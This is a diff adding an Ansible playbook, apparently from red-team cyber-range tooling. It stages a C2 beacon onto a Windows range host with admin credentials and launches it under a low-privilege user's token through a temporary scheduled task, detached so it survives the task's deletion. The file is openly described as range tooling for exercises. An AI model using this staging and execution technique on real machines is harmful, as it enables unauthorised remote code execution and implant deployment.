@@ -1,0 +1,105 @@
+# Managed by redStackPRO (redstackpro.jumpbox). Do not edit on the host.
+# A STATIC file, delivered verbatim by copy -- NOT a template. Its {{ }} are
+# runtime variables of this playbook, resolved when rsp-launch-beacon runs it
+# with --extra-vars, and must reach the host unrendered. Templating it at install
+# time is exactly the bug that made an early deploy fail with "'target' is
+# undefined": Ansible evaluated these before the values existed.
+#
+# Stage a beacon onto a range host and run it as patient zero, with no GUI.
+#
+# The portal is the path a person takes: open the patient-zero tile, drag the
+# beacon onto the mapped drive, double-click it. That needs a browser and a
+# human, so it is not available to a script or to an automated solution run.
+# This playbook is the headless equivalent and nothing more.
+#
+# It is range-owner tooling, not an attack step, and it is honest about that:
+# staging uses the range's own admin credential, because patient zero is a
+# Domain Users member with no write access to ADMIN$ or C$ and every remote
+# execution path that matters (psexec, smbexec, wmiexec, atexec) needs one. What
+# it does NOT do is run the beacon as that admin. The scheduled task carries
+# patient zero's own credential, so the process starts under patient zero's
+# token -- which is the only part the solution actually depends on.
+---
+- name: Launch a beacon as patient zero
+  hosts: "{{ target }}"
+  gather_facts: false
+  tasks:
+    - name: Fail early if the beacon is not in the drop folder
+      ansible.builtin.stat:
+        path: "{{ beacon }}"
+      delegate_to: localhost
+      register: rsp_beacon
+      failed_when: not rsp_beacon.stat.exists
+
+    - name: Stage the beacon
+      # Windows Temp rather than the user's profile: the staging credential is
+      # the range admin, and writing into patient zero's profile as another
+      # account creates ownership the task then cannot read.
+      ansible.windows.win_copy:
+        src: "{{ beacon }}"
+        dest: 'C:\Windows\Temp\{{ beacon | basename }}'
+
+    - name: Run it under patient zero's token
+      ansible.windows.win_powershell:
+        parameters:
+          Exe: 'C:\Windows\Temp\{{ beacon | basename }}'
+          RunAs: "{{ run_as }}"
+          RunPw: "{{ run_password }}"
+        script: |
+          param($Exe, $RunAs, $RunPw)
+          $name = 'rsp-beacon'
+          # schtasks writes to stderr on benign conditions (deleting a task that
+          # is not there, for one), and under $ErrorActionPreference='Stop' a
+          # native command's stderr is turned into a terminating NativeCommandError.
+          # So gate on $LASTEXITCODE instead, and merge stderr into the captured
+          # output rather than letting it throw. A scheduled task is what carries
+          # another account's token without an interactive logon; it is registered,
+          # run, and removed so it is not left behind as unasked-for persistence.
+          $ErrorActionPreference = 'Continue'
+          # The task must not run the beacon as ITS OWN process. If it does, the
+          # beacon IS the scheduled task's process, and the /Delete below -- which
+          # terminates a running task -- kills the beacon a few seconds after it
+          # starts. That is why an earlier run launched failed=0 yet no session
+          # ever landed, and it was misread as a session-0 limitation. Instead the
+          # task's action spawns the beacon as a DETACHED grandchild via
+          # `cmd /c start`, so the task's own process exits immediately on its own
+          # and /Delete reaps nothing live. The beacon keeps running in patient
+          # zero's token. Found on the AWS kill-chain run.
+          # No embedded quotes: schtasks /TR takes a single value that the shell
+          # quote-wraps, and inner quotes break that wrapping (they did, with
+          # "Invalid argument/option"). The staged path is under C:\Windows\Temp
+          # with no spaces, so `start` takes it bare and treats it as the program
+          # rather than a window title. `start` is what detaches it.
+          $action = "cmd.exe /c start $Exe"
+          # /Create with /F overwrites any existing task, so no pre-delete (the
+          # pre-delete was the benign stderr that failed the whole run).
+          $create = schtasks.exe /Create /TN $name /TR $action /SC ONCE /ST 00:00 `
+                      /RU $RunAs /RP $RunPw /RL LIMITED /F 2>&1
+          if ($LASTEXITCODE -ne 0) { throw "task create failed: $create" }
+          $run = schtasks.exe /Run /TN $name 2>&1
+          if ($LASTEXITCODE -ne 0) {
+            schtasks.exe /Delete /TN $name /F 2>&1 | Out-Null
+            throw "task run failed: $run"
+          }
+          # The launcher task fires cmd, cmd starts the detached beacon and both
+          # exit; the beacon is a separate process now. Wait for the task itself
+          # to leave Running so /Delete cannot catch it mid-flight, then remove it
+          # so nothing is left behind as unasked-for persistence.
+          for ($i = 0; $i -lt 15; $i++) {
+            Start-Sleep -Seconds 1
+            $q = schtasks.exe /Query /TN $name /FO LIST 2>&1 | Select-String 'Status:'
+            if ($q -notmatch 'Running') { break }
+          }
+          schtasks.exe /Delete /TN $name /F 2>&1 | Out-Null
+          Write-Output "launched $Exe as $RunAs"
+      # The beacon calls back on its own schedule, so the task exiting says
+      # nothing about whether a session landed. Check the teamserver.
+      register: rsp_launch
+      changed_when: true
+
+    - name: Say what happened
+      ansible.builtin.debug:
+        msg: >-
+          {{ rsp_launch.output | default(['(no output)']) | join(' ') }}.
+          The callback is asynchronous -- look for the session on the
+          teamserver, not here.
